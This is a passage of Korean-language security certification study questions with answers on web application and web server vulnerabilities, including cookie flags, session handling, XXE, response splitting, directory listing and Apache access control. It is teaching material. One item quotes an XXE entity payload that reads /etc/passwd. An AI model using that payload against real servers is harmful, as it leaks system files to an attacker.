<strong>정답:</strong> 공격자가 XSS 취약점을 이용해 악성 스크립트(예: <code>document.cookie</code> 호출)를 삽입하더라도, 브라우저는 <strong>HttpOnly</strong> 속성이 설정된 쿠키 값에 대한 <strong>스크립트 접근 권한을 제한</strong>한다. 따라서 공격자 서버로 세션 쿠키 값이 전송되는 것을 원천 차단하여 세션 탈취를 방지할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>Secure</strong> 속성을 쿠키에 설정해야 하는 구체적인 이유를 통신 보안(구간 암호화) 관점에서 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> HTTPS가 아닌 일반 HTTP 평문 통신 환경에서 쿠키가 전송될 경우, <strong>스니핑(Sniffing)</strong>과 같은 네트워크 도청을 통해 세션 정보를 쉽게 탈취당할 수 있다. <strong>Secure</strong> 속성은 오직 <strong>SSL/TLS 암호화 레이어</strong> 상에서만 쿠키를 실어 보내도록 강제함으로써 전송 구간에서의 세션 정보 유출을 예방한다.
</blockquote>
</details>

<details>
<summary>(서술형) 세션 하이재킹 공격을 무력화하기 위해 웹 서버가 매 로그인 시마다 이행해야 하는 핵심적인 세션 관리 원칙을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 고정된 세션 ID를 재사용하지 않고, 매 로그인 시마다 공격자가 예측하거나 추측할 수 없는 <strong>랜덤한 값으로 새로운 세션 ID를 발급</strong>하여 사용자에게 전달해야 한다.
</blockquote>
</details>

<details>
<summary>(작업형) 정보보안 가이드라인에서 권고하는 보편적인 웹 애플리케이션의 세션 유효 시간(Inactivity Timeout) 범위는?</summary>
<blockquote>
<strong>정답:</strong> 일반적으로 <strong>10분 ~ 30분</strong> 사이를 권장한다.
</blockquote>
</details>

<details>
<summary>[561] (단답형) OWASP Top 10에 포함되는 취약점 중 하나로, 공격자가 웹 애플리케이션의 파라미터를 조작하여 자신에게 허가되지 않은 다른 사용자의 데이터(예: <code>Mypage?id=admin</code>)나 기능에 직접 접근할 수 있도록 허용하는 취약점의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>IDOR</code> (Insecure Direct Object Reference)
</blockquote>
</details>

### 정보누출 취약점

<details>
<summary>(단답형) 개발자의 부주의로 인해 주석이나 에러 메시지에 중요 정보(계정, 내부 경로, 서버 버전 등)가 포함되어 외부로 노출되는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>정보 누출 (Information Leakage)</strong> 취약점
</blockquote>
</details>

<details>
<summary>(단답형) 아파치(Apache) 웹 서버에서 403, 404 등 에러 코드별로 서버가 기본 제공하는 정보 대신 사용자 정의 페이지를 보여주기 위해 사용하는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <code>ErrorDocument</code>
</blockquote>
</details>

<details>
<summary>(단답형) PHP 환경에서 실행 중 발생하는 Warning이나 Error 메시지가 사용자 브라우저에 그대로 출력되지 않도록 제어하는 <code>php.ini</code> 설정 항목은?</summary>
<blockquote>
<strong>정답:</strong> <code>display_errors = Off</code>
</blockquote>
</details>

<details>
<summary>(서술형) 정보 누출 취약점이 시스템 전체 보안에 미치는 영향력을 <strong>공격의 실마리</strong> 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 정보 누출은 그 자체로 파괴적인 공격은 아니지만, 공격자가 침투 전 수행하는 <strong>사전 정보 수집(Reconnaissance)</strong> 단계에서 핵심적인 단초를 제공한다. 서버의 종류/버전, OS 정보, 내부 파일 경로 등이 노출되면 공격자는 해당 환경에 최적화된 공격 기법이나 취약점(Exploit)을 정교하게 선택할 수 있게 된다.
</blockquote>
</details>

<details>
<summary>(서술형) 아파치 서버의 <strong>디폴트 에러 페이지(Default Error Page)</strong>를 변경하지 않고 그대로 노출했을 때, 공격자가 획득할 수 있는 구체적인 서버 정보 2가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> 웹 서버의 종류 및 버전 정보(예: Apache/2.2.14), 서버 시스템의 IP 주소 및 서비스 포트 번호, 운영체제(OS) 정보 등이 노출될 수 있다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 아파치 <code>httpd.conf</code> 설정 파일의 일부이다. 404 에러 발생 시 <code>/home/security/error_page.php</code>가 출력되도록 빈칸을 채우시오.</summary>
<blockquote>
(지시어) (에러코드) (경로)<br>
<strong>정답:</strong> <code>ErrorDocument 404 /home/security/error_page.php</code>
</blockquote>
</details>

### 기타 웹 애플리케이션 취약점

<details>
<summary>(단답형) 사용자 입력값에 개행 문자(CR/LF)를 포함시켜 응답 헤더를 두 개 이상으로 조각내고, 두 번째 응답 바디에 악성 코드를 삽입하는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>HTTP 응답 분할</strong> (Response Splitting) 취약점
</blockquote>
</details>

<details>
<summary>(단답형) XML 파서가 외부 자원을 참조하는 개체를 처리할 때 발생하는 취약점으로, 서버 파일 접근이나 DoS 공격에 악용될 수 있는 공격은?</summary>
<blockquote>
<strong>정답:</strong> <strong>XXE</strong> (XML External Entity) 인젝션 취약점
</blockquote>
</details>

<details>
<summary>(단답형) XML DTD 내에서 개체 하나가 다른 개체를 수없이 반복 참조하게 하여 서버의 메모리 자원을 고갈시키는 DoS 공격 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>XML Bomb</strong> (또는 Billion Laughs 공격)
</blockquote>
</details>

<details>
<summary>(단답형) XXE 공격을 방어하기 위해 PHP 소스 레벨에서 외부 개체 로딩 기능을 명시적으로 차단할 때 사용하는 함수명은?</summary>
<blockquote>
<strong>정답:</strong> <code>libxml_disable_entity_loader(true)</code>
</blockquote>
</details>

<details>
<summary>(단답형) 사람이 이미지를 보고 문자를 입력하게 함으로써, 자동화된 봇(Bot)이나 프로그램에 의한 무차별 대입 공격을 차단하는 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>캡차 (CAPTCHA)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) XML 문서의 특정 요소에 접근하기 위한 경로 언어에 조작된 쿼리를 삽입하여 인증을 우회하거나 데이터에 접근하는 공격은?</summary>
<blockquote>
<strong>정답:</strong> <strong>XPath 인젝션</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 로그인이나 개인정보 전송 시 암호화되지 않은 HTTP 통신을 사용하여, 공격자가 스니핑을 통해 중요 정보를 획득하게 되는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>데이터 평문 전송</strong> 취약점
</blockquote>
</details>

<details>
<summary>(서술형) <strong>인증(Authentication)</strong>과 <strong>인가(Authorization)</strong>의 핵심적인 차이점을 보안 관점에서 구분하여 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>인증</strong>은 사용자가 누구인지 신원을 확인하는 과정(계정 관리)인 반면, <strong>인가</strong>는 인증된 사용자가 특정 자원이나 기능에 접근할 수 있는 정당한 권한을 가졌는지 결정하는 과정(서비스 관리)이다.
</blockquote>
</details>

<details>
<summary>(서술형) HTTP 응답 분할 취약점에서 사용되는 개행 문자 <strong>CR</strong>과 <strong>LF</strong>의 URL 인코딩 값 및 각각의 기능을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>CR</strong>(%0D)은 커서의 위치를 줄의 맨 앞으로 이동시키고, <strong>LF</strong>(%0A)는 커서를 다음 줄로 이동시키는 기능을 수행한다. 이 두 문자의 조합(<code>%0D%0A</code>)을 연속으로 사용하여 HTTP 응답 헤더의 끝을 알리고 분할된 새로운 응답을 생성할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>XXE</strong> 공격 구문 중 <code>&lt;!ENTITY foo SYSTEM "file:///etc/passwd"&gt;</code> 코드에서 <code>SYSTEM</code> 키워드의 역할과 공격자가 얻고자 하는 결과는?</summary>
<blockquote>
<strong>정답:</strong> <code>SYSTEM</code> 키워드는 외부 자원(Identifier)을 참조하겠다는 선언이며, 공격자는 이를 통해 <strong>서버 로컬 시스템의 중요 파일(예: /etc/passwd)</strong> 내용을 <code>foo</code> 개체에 담아 출력함으로써 중요 정보를 탈취하고자 한다.
</blockquote>
</details>

<details>
<summary>(서술형) 비정상적인 포인트 적립이나 결제 취소 시나리오 등에서 발생하는 <strong>자동화 공격</strong> 취약점의 근본적인 원인과 대응책을 1가지씩 기술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>원인</strong>: 특정 프로세스(요청 단계)에 대한 시간당 접근 횟수 제한이나 사람/기계 구별 로직이 부재하기 때문.<br>
- <strong>대응책</strong>: 임계치 설정을 통한 <strong>Rate Limiting</strong> 적용 또는 <strong>CAPTCHA</strong> 도입을 통해 실제 사람임을 인증하게 한다.
</blockquote>
</details>

<details>
<summary>(서술형) 클라이언트 측에 저장되는 <strong>쿠키(Cookie)</strong> 방식보다 서버 측 <strong>세션(Session)</strong> 방식이 보안상 우수한 이유를 자원 관리 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 쿠키는 전적으로 클라이언트(브라우저) 자원을 사용하므로 조작이나 변조가 매우 용이하고 유출될 위험이 크다. 반면, <strong>세션</strong>은 서버의 자원(메모리 또는 DB)에 실제 정보를 저장하고 사용자에게는 임의의 세션 ID만 제공하므로 보안성 측면에서 훨씬 우수하다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 Wireshark 패킷 캡처 데이터 중 <code>HTTP Post Data</code>에 <code>id=kiwi99&pass=z1dn199</code>가 평문으로 노출되었다. 이 보안 문제를 해결하기 위한 시스템적 조우 조치는?</summary>
<blockquote>
<strong>정답:</strong> <strong>SSL/TLS (HTTPS)</strong> 기반의 보안 서버를 구축하여, 전송 구간 암호화를 통해 패킷 감청 시 정보가 노출되지 않도록 조치해야 한다.
</blockquote>
</details>

<details>
<summary>(작업형) XML 파싱 로직에서 <code>libxml_disable_entity_loader(true);</code> 설정을 적용했을 때 방어할 수 있는 주요 취약점의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>XXE (XML External Entity)</strong> 인젝션 취약점
</blockquote>
</details>

<details>
<summary>(작업형) 비밀번호 찾기 기능에서 <strong>취약한 패스워드 복구</strong> 문제를 방지하기 위해 생성해야 할 임시 비밀번호의 특징 2가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. 사용자 정보를 기반으로 하지 않는 충분한 길이의 <strong>안전한 난수</strong>를 사용해야 한다.<br>
2. 화면에 즉시 출력하지 않고 본인만이 확인 가능한 수단(등록된 이메일 등)으로만 발송한다.
</blockquote>
</details>

### 개발 보안관리

<details>
<summary>(단답형) 클라이언트 측의 입력값 검증은 우회가 가능하므로, 보안을 위한 최종적인 데이터 검증 및 통제는 반드시 어느 위치에서 수행되어야 하는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>서버 (Server-Side)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 중요 정보 전송 시 데이터가 URL에 그대로 노출되어 히스토리에 남는 위험을 방지하기 위해 선택해야 하는 HTTP 메서드는?</summary>
<blockquote>
<strong>정답:</strong> <strong>POST</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 로그아웃 후 브라우저의 [뒤로 가기] 기능을 통한 민감 정보 노출을 방지하기 위해 응답 헤더 및 메타 태그에 설정하는 값은?</summary>
<blockquote>
<strong>정답:</strong> <strong>no-cache</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 암호화 구현 시 기밀성을 보장받기 위해 인코딩 알고리즘 대신 반드시 사용해야 하는 알고리즘의 기준은?</summary>
<blockquote>
<strong>정답:</strong> <strong>공인된 표준 암호화 알고리즘</strong> (예: AES, 3DES, SEED 등)
</blockquote>
</details>

<details>
<summary>(서술형) 클라이언트 측(자바스크립트 등)에서의 일차적 입력값 검증이 갖는 <strong>UX(사용자 경험)</strong> 측면의 장점과 <strong>보안</strong> 측면의 한계점을 각각 기술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>장점(UX)</strong>: 서버로 데이터를 보내기 전 즉각적인 피드백을 주어 서버 부하를 줄이고 사용자 반응 속도를 높인다.<br>
- <strong>한계점(보안)</strong>: 웹 프록시 도구를 활용한 패킷 변조나 브라우저의 스크립트 실행 비활성화 등을 통해 손쉽게 우회될 수 있어 신뢰할 수 없다.
</blockquote>
</details>

<details>
<summary>(서술형) 중요한 트랜잭션(정보 수정 등) 수행 시 로그인 상태임에도 <strong>비밀번호를 재확인</strong>하는 절차를 두는 궁극적인 보안 목적은?</summary>
<blockquote>
<strong>정답:</strong> 세션 하이재킹이나 자리를 비운 사이의 타인에 의한 부정 사용 등 <strong>위장된 사용자</strong>에 의한 불법적인 요청을 차단하고, 최종 단계에서 사용자 본인임을 다시 입증하여 피해를 예방하기 위함이다.
</blockquote>
</details>

<details>
<summary>(서술형) 암호화 체계 운용 시 소스코드 내에 <strong>하드코딩(Hardcoding)</strong>을 절대 금지해야 하는 핵심 항목 2가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> 1. 내부 시스템 접속을 위한 계정정보/비밀번호, 2. 데이터 암호화 및 복호화에 사용되는 <strong>암호화 키 (Encryption Key)</strong>.
</blockquote>
</details>

<details>
<summary>(작업형) 웹 페이지의 캐시를 방지하기 위해 HTML <code>&lt;head&gt;</code> 부분에 삽입해야 할 메타 태그 2줄을 작성하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
<code>&lt;meta HTTP-EQUIV="Pragma" CONTENT="no-cache"&gt;</code><br>
<code>&lt;meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache"&gt;</code>
</blockquote>
</details>

<details>
<summary>(작업형) 사용자가 입력한 중요 값을 쿠키(Cookie)에 보관해야 할 불가피한 상황이 발생했을 때, 보안성을 확보하기 위해 적용해야 할 필수 조치 2가지는?</summary>
<blockquote>
<strong>정답:</strong> 1. 보관되는 값에 대한 <strong>강력한 암호화</strong> 적용, 2. 전송 시 <strong>Secure/HttpOnly</strong> 속성 부여.
</blockquote>
</details>

<details>
<summary>[562] (단답형) C언어에서 문자열 복사 시 대상 버퍼의 크기를 검사하지 않아 버퍼 오버플로우를 유발할 수 있는 취약한 함수인 <code>strcpy</code>를 대체하여, 지정된 길이(n)만큼만 문자열을 안전하게 복사하도록 권장되는 함수의 명칭을 쓰시오.</summary>
<blockquote>
<code>strncpy</code> (또는 <code>strlcpy</code>)
</blockquote>
</details>

<details>
<summary>[563] (서술형) 안드로이드 애플리케이션 보안을 위해 소스코드 난독화(Obfuscation)를 수행해야 하는 이유를 리버스 엔지니어링(Reverse Engineering) 관점에서 설명하시오.</summary>
<blockquote>
안드로이드 앱은 디컴파일 도구를 통해 실행파일(<code>.apk</code>)을 소스코드로 쉽게 변환할 수 있어 로직 분석이 용이하다. 난독화는 변수명이나 메서드명을 무의미하게 변경하거나 코드 흐름을 복잡하게 만들어, 공격자가 화이트박스 분석을 통해 취약점을 찾아내거나 소스코드를 도용하는 리버스 엔지니어링 시도를 어렵게 하기 위해 반드시 필요하다.
</blockquote>
</details>

<details>
<summary>[564] (서술형) 안드로이드 애플리케이션 보안을 위해 소스코드 난독화(Obfuscation)를 적용할 때의 기대 효과와, 난독화만으로는 완벽한 보안을 담보할 수 없는 한계점을 서술하시오.</summary>
<blockquote>
<strong>기대 효과</strong>: 디컴파일을 통해 소스코드를 복원하더라도 클래스명이나 변수명 등이 암호화/축약되어 있어 공격자가 로직을 분석하고 취약점을 파악하는 데 걸리는 시간과 비용을 크게 증가시킬 수 있다.<br>
<strong>한계점</strong>: 난독화는 코드를 읽기 어렵게 만들 뿐이지 실행 파일 자체가 암호화되는 것은 아니며 취약점 자체를 제거하는 것이 아니므로, 시간과 노력을 들인 구조 분석이나 런타임 메모리 분석 등을 통해 결국 역공학(Reverse Engineering)이 가능하다는 한계가 있다.
</blockquote>
</details>

<details>
<summary>[565] (단답형) 안드로이드 앱의 필수 권한 선언 및 앱 구성 정보를 담고 있는 설정 파일의 명칭을 작성하시오.</summary>
<blockquote>
<code>AndroidManifest.xml</code>
</blockquote>
</details>

## [9] 웹 서버 취약점

### Directory Listing 취약점

<details>
<summary>(단답형) 웹 서버 설정 미흡으로 디렉터리 경로 요청 시 해당 폴더 안의 모든 파일과 하위 디렉터리 목록이 브라우저에 출력되는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>디렉터리 리스팅 (Directory Listing)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 공격자가 서버의 디렉터리 구조를 파악하거나 중요 파일을 찾기 위해 URL 주소를 직접 추측하여 입력해 접근을 시도하는 공격 기법은?</summary>
<blockquote>
<strong>정답:</strong> <strong>강제 브라우징 (Forced Browsing)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 아파치(Apache) 웹 서버에서 디렉터리 리스팅을 방지하기 위해 <code>httpd.conf</code>의 <code>&lt;Directory&gt;</code> 섹션 내 <code>Options</code> 지시어에서 삭제해야 할 항목은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Indexes</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 톰캣(Tomcat) 웹 서버의 <code>web.xml</code> 설정 파일 내 <code>DefaultServlet</code> 설정 중 디렉터리 리스팅을 제어하기 위해 <code>false</code>로 지정해야 하는 파라미터 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>listings</strong> (<code>&lt;param-name&gt;listings&lt;/param-name&gt;</code>)
</blockquote>
</details>

<details>
<summary>(단답형) 윈도우 IIS 웹 서버의 홈 디렉터리 설정에서 이 옵션이 선택되어 있으면 파일 목록이 노출된다. 이 설정 항목의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>디렉터리 검색</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 디렉터리 리스팅 기능이 차단된 서버에 디렉터리 경로만으로 접근을 시도했을 때 반환되는 HTTP 응답 상태 코드는?</summary>
<blockquote>
<strong>정답:</strong> <strong>403</strong> (Forbidden)
</blockquote>
</details>

<details>
<summary>(서술형) 디렉터리 리스팅 취약점이 활성화되었을 때 공격자가 탈취할 수 있는 보안상 민감한 파일의 예시 2가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> 1. 데이터베이스 접속 정보 등이 하드코딩된 웹 <strong>소스 코드 파일</strong>(<code>config.php</code> 등), 2. 시스템 운영 백업 파일(<code>.bak</code>, <code>.old</code>, <code>.zip</code>), 3. 데이터베이스 덤프 파일(<code>.sql</code>) 등.
</blockquote>
</details>

<details>
<summary>(서술형) 웹 서버 응답 메시지의 <code>&lt;title&gt;</code> 태그 내용에 <strong>"Index of /"</strong>라는 문자열과 함께 상태 코드 <strong>200 OK</strong>가 기록되었다면 이를 보안적으로 어떻게 해석해야 하는가?</summary>
<blockquote>
<strong>정답:</strong> 해당 웹 서버의 디렉터리 리스팅 취약점이 활성화되어 있어, 공격자가 <strong>서버의 파일 목록을 정상적으로 열람(인덱싱)</strong>하는 데 성공한 상황으로 해석해야 한다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 아파치 설정을 보고, 보안을 위해 수정해야 할 부분을 작성하시오.<br><code>&lt;Directory /var/www/html&gt; Options Indexes FollowSymLinks AllowOverride None &lt;/Directory&gt;</code></summary>
<blockquote>
<strong>정답:</strong> <code>Options</code> 지시어에서 <strong>Indexes</strong> 항목을 제거하거나, <code>Options None</code>(또는 <code>Options -Indexes</code>)으로 수정하여 디렉터리 목록 노출을 차단해야 한다.
</blockquote>
</details>

<details>
<summary>(작업형) 톰캣 서버에서 디렉터리 리스팅을 차단하기 위한 <code>web.xml</code>의 <code>init-param</code> 설정 값을 완성하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>&lt;param-name&gt;listings&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt;</code>
</blockquote>
</details>

### Web Service Method 설정 취약점

<details>
<summary>(단답형) 웹 서버에서 기본적으로 사용하는 GET, POST 외에 PUT, DELETE 등의 불필요한 HTTP 메소드를 허용할 경우 발생하는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>웹 서비스 메소드 설정</strong> 취약점
</blockquote>
</details>

<details>
<summary>(단답형) 대상 웹 서버가 어떠한 HTTP 메소드(GET, POST, PUT 등)를 지원하고 있는지 리스트를 확인하기 위한 요청 메소드는?</summary>
<blockquote>
<strong>정답:</strong> <strong>OPTIONS</strong>
</blockquote>
</details>

<details>
<summary>(단답형) <code>OPTIONS</code> 요청에 대한 응답 메시지에서, 서버가 지원하는 메소드 목록을 나열하여 보여주는 헤더 필드의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Allow</strong> (예: Allow: GET, HEAD, POST, OPTIONS, TRACE)
</blockquote>
</details>

<details>
<summary>(단답형) 아파치(Apache) 서버 설정에서 GET, POST 메서드를 제외한 나머지 모든 메서드의 요청을 거부하도록 지정할 때 사용하는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>&lt;LimitExcept GET POST&gt;</strong>
</blockquote>
</details>

<details>
<summary>(서술형) <strong>PUT</strong> 메소드와 <strong>DELETE</strong> 메소드가 활성화된 웹 서버에서 공격자가 행할 수 있는 악의적인 행위 2가지를 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 1. <strong>PUT</strong> 메소드로 악성 스크립트(웹쉘) 파일을 서버에 임의로 생성하여 원격 명령 실행 권한을 획득할 수 있다. 2. <strong>DELETE</strong> 메소드로 서버 내 주요 설정 파일이나 데이터를 무단으로 삭제하여 웹 서비스에 장애를 유발할 수 있다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음은 아파치 <code>httpd.conf</code> 설정의 일부이다. GET, POST 이외의 모든 메소드를 차단하기 위한 설정을 완성하시오.</summary>
<blockquote>
<code>&lt;Directory "/var/www/html"&gt;</code><br>
<strong>(빈칸 1)</strong><br>
<code> Order allow,deny</code><br>
<code> Deny from all</code><br>
<strong>(빈칸 2)</strong><br>
<code>&lt;/Directory&gt;</code><br>
<br>
<strong>정답:</strong> 빈칸 1: <strong>&lt;LimitExcept GET POST&gt;</strong>, 빈칸 2: <strong>&lt;/LimitExcept&gt;</strong>
</blockquote>
</details>

### 관리자 페이지 노출 취약점

<details>
<summary>(단답형) 웹 애플리케이션의 관리 기능 주소가 <code>admin/</code>, <code>manager/</code>와 같이 추측 가능한 형태로 구성되어 공격자의 접근을 허용하는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>관리자 페이지 노출</strong> 취약점
</blockquote>
</details>

<details>
<summary>(단답형) 아파치(Apache) 서버 설정 중 <code>Allow</code>(허용)와 <code>Deny</code>(거부) 지시자의 처리 우선순위를 결정하는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>Order</strong>
</blockquote>
</details>

<details>
<summary>(단답형) <code>Order Allow, Deny</code> 설정 하에서 특정 관리자 IP만 허용하고 나머지를 차단하려고 할 때, 마지막에 명시해야 하는 구문은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Deny from all</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 인가되지 않은 외부 IP가 관리자 전용 페이지 접근을 시도하여 서버에 의해 차단되었을 때 반환되는 HTTP 상태 코드는?</summary>
<blockquote>
<strong>정답:</strong> <strong>403</strong> (Forbidden)
</blockquote>
</details>

<details>
<summary>(서술형) 관리자 페이지의 기밀성을 확보하기 위해 적용할 수 있는 <strong>URL 관리 측면</strong>과 <strong>접근 통제 측면</strong>의 조치를 각각 한 가지씩 기술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>URL 관리 측면</strong>: <code>admin.php</code>와 같은 고정된 이름을 탈피하여 <code>agsmgr_712.php</code>와 같이 추측이 어려운 임의의 파일명으로 변경하여 운영한다.<br>
- <strong>접근 통제 측면</strong>: 아파치 등의 설정 파일에서 <strong>IP 기반 ACL</strong>을 적용하여 허가된 특정 관리자 PC(IP)에서만 접속이 가능하도록 제한한다.
</blockquote>
</details>

<details>
<summary>(서술형) 다음 설정이 논리적으로 잘못된 이유를 <strong>Order</strong> 지시자의 처리 순서와 연관 지어 설명하시오.<br><code>Order Deny, Allow</code><br><code>Allow from all</code><br><code>Deny from 192.168.1.10</code></summary>
<blockquote>
<strong>정답:</strong> <code>Order Deny, Allow</code>는 <strong>거부(Deny) 규칙을 먼저 처리한 뒤 허용(Allow) 규칙을 마지막에 처리</strong>한다. <code>192.168.1.10</code>이 첫 번째 단계에서 차단되더라도, 마지막 단계의 <code>Allow from all</code>에 의해 모든 IP가 허용되므로 결과적으로 차단 대상 IP의 접근을 막지 못하는 논리적 오류가 발생한다.
</blockquote>
</details>

<details>
<summary>(작업형) 아파치의 <code>httpd.conf</code> 설정이다. 관리자 IP가 <code>192.168.56.30</code>일 때만 <code>/admin</code> 디렉터리 접근을 허용하고 나머지는 차단하도록 빈칸을 채우시오.</summary>
<blockquote>
<code>&lt;Directory "/var/www/html/admin"&gt;</code><br>
<strong>(빈칸 1) Allow, Deny</strong><br>
<strong>(빈칸 2) from 192.168.56.30</strong><br>
<strong>(빈칸 3) from all</strong><br>
<code>&lt;/Directory&gt;</code><br>
<br>
<strong>정답:</strong> 빈칸 1: <strong>Order</strong>, 빈칸 2: <strong>Allow</strong>, 빈칸 3: <strong>Deny</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 아파치에서 <code>Order Allow, Deny</code> 설정 시, <code>Allow from</code> 뒤에 기입할 수 있는 대상의 종류(IP 특정 방식) 2가지를 예시와 함께 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 1. <strong>특정 IP</strong> (예: 192.168.10.5), 2. <strong>IP 대역/네트워크</strong> (예: 192.168.10 또는 192.168.10.0/24)
</blockquote>
</details>

### 위치 공개 취약점

<details>
<summary>(단답형) 개발 과정이나 소스 코드 수정 시 생성된 백업 파일, 로그, 압축 파일 등이 웹 루트 디렉터리에 노출되어 핵심 정보가 유출될 수 있는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>위치 공개</strong> 취약점 (또는 중요 파일 노출)
</blockquote>
</details>

<details>
<summary>(단답형) 아파치(Apache) 서버 설정 파일(<code>httpd.conf</code>)에서 특정 확장자(예: <code>.bak</code>, <code>.gz</code>)에 대한 접근을 정규표현식 등으로 매칭하여 제어하기 위해 사용하는 섹션 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>&lt;Files&gt;</strong> (또는 <strong>&lt;FilesMatch&gt;</strong>)
</blockquote>
</details>

<details>
<summary>(단답형) 차단된 백업 파일(예: <code>source.tar.gz</code>)에 대해 외부 공격자가 직접 URL을 입력하여 접근을 시도했을 때, 서버가 반환하는 거절 응답 상태 코드는?</summary>
<blockquote>
<strong>정답:</strong> <strong>403</strong> (Forbidden)
</blockquote>
</details>

<details>
<summary>(서술형) 위치 공개 취약점이 발생하여 소스 코드 압축 파일(<code>source.tar.gz</code>) 등이 유출되었을 때, 공격자가 2차적으로 수행할 수 있는 위협 2가지를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 1. 전체 <strong>소스 코드 분석(White Box Analysis)</strong>을 통해 정교한 취약점을 찾아내어 시스템 권한을 획득할 수 있다. 2. 소스 코드 내에 하드코딩된 <strong>데이터베이스 접속 계정</strong>이나 <strong>API 키</strong> 정보를 탈취하여 2차 피해를 유발할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) 아파치 설정 중 <code>&lt;Files ~ "\.bak$"&gt; Order allow,deny Deny from all &lt;/Files&gt;</code> 코드의 보안적 효과를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 파일 이름이 <strong><code>.bak</code> 확장자로 끝나는 모든 파일</strong>에 대해 모든 사용자의 직접 접근을 거부한다. 이를 통해 에디터나 백업 툴이 자동으로 생성한 백업 파일이 실수로 서버에 방치되더라도 외부로 유출되는 것을 원천 차단한다.
</blockquote>
</details>

<details>
<summary>(작업형) 아파치 환경에서 <code>.gz</code> 확장자를 가진 압축 파일에 대해 모든 접근을 차단하도록 <code>httpd.conf</code> 설정을 완성하시오.</summary>
<blockquote>
<code>&lt;Files ~ "<strong>(빈칸 1)</strong>"&gt;</code><br>
<code> Order allow,deny</code><br>
<code> <strong>(빈칸 2)</strong> from all</code><br>
<code>&lt;/Files&gt;</code><br>
<br>
<strong>정답:</strong> 빈칸 1: <strong>\.gz$</strong>, 빈칸 2: <strong>Deny</strong>
</blockquote>
</details>

### 검색엔진 정보 노출 취약점

<details>
<summary>(단답형) 검색 엔진이 웹 데이터베이스를 보충하기 위해 웹 사이트의 정보를 자동으로 수집하는 프로그램을 무엇이라 하는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>검색 로봇 (Search Robot)</strong> 또는 크롤러 (Crawler)
</blockquote>
</details>

<details>
<summary>(단답형) 검색 로봇에 대해 웹 사이트의 특정 디렉터리나 파일에 대한 접근 권한을 명시하여 노출을 제어하는 국제 규약 파일의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>robots.txt</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 네이버(Naver)에서 정보를 수집하기 위해 운영하는 대표적인 검색 로봇 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Yeti</strong> (또는 naverbot)
</blockquote>
</details>

<details>
<summary>(단답형) <code>robots.txt</code> 설정에서 모든 검색 로봇을 지칭할 때 <code>User-agent</code> 지시어 뒤에 사용하는 기호는?</summary>
<blockquote>
<strong>정답:</strong> <strong>*</strong> (애스터리스크)
</blockquote>
</details>

<details>
<summary>(서술형) <code>robots.txt</code> 설정이 보안 기술로서 갖는 <strong>규약(약속)</strong>적 성격의 한계점을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>robots.txt</code>는 검색 엔진 운영자 간에 약속된 권고 사항일 뿐, 기술적인 강제성이 없다. 따라서 이를 준수하지 않는 <strong>악의적인 검색 로봇</strong>이나 크롤러는 설정을 무시하고 웹 서버의 모든 콘텐츠를 수집할 수 있으므로 근본적인 접근 차단책으로는 부족하다.
</blockquote>
</details>

<details>
